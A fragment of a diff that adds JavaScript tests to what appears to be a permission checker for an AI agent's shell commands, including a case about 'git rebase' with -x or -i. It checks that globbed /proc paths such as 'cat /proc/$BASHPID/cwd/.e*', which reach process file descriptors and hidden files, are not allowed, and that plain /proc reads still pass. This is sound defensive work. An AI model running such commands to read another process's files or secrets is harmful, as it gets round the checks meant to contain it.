+    assert.notEqual(before.reason ?? "", "git rebase with -x or -i runs a command or an editor", c);
+  });
+});
+
+// The closing runs (step 7, Sonnet 6): a /proc path built with an expansion and holding a glob.
+describe("r4 step 7: a /proc glob built at run time", () => {
+  for (const c of ["ls /proc/$$/fd/*", "ls /proc/$$/f?/*", "cat /proc/$BASHPID/cwd/.e*"]) test(`r4 step 7: not an allow: ${JSON.stringify(c)}`, async () => {
+    const d = await decide(c);
+    assert.notEqual(d.effect, "allow", `${c}: ${d.reason}`);
+  });
+  for (const c of ["ls /proc/cpuinfo", "cat /proc/$$/status"]) test(`r4 step 7: as before: ${JSON.stringify(c)}`, async () => {
+    assert.ok(await decide(c));
   });
 });
